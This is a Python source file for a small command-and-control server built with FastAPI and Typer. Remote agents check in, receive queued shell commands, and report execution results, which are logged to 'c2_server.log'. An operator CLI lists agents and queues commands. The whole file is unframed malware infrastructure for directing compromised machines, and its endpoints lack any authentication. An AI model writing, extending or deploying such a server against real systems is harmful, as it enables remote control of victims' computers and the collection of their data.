from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict
import typer
import logging

app = FastAPI()
cli = typer.Typer()
agents: Dict[str, Dict] = {}

logging.basicConfig(filename="c2_server.log", level=logging.INFO)

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"commands": []}
        logging.info(f"New agent registered: {agent_id}")
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        return {"Command": command}
    return {"Command": None}

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    result = request.Result
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    logging.info(f"Agent {agent_id} executed command with result: {result}")
    return {"Status": "OK"}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

@cli.command()
def list_agents():
    """List all registered agents."""
    for agent_id in agents:
        typer.echo(f"Agent ID: {agent_id}, Pending Commands: {len(agents[agent_id]['commands'])}")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        typer.echo(f"Command sent to agent {agent_id}")
    else:
        typer.echo(f"Agent {agent_id} not found")

if __name__ == "__main__":
    import uvicorn
    import threading

    def run_server():
        uvicorn.run(app, host="0.0.0.0", port=8000)

    server_thread = threading.Thread(target=run_server)
    server_thread.start()
    cli()
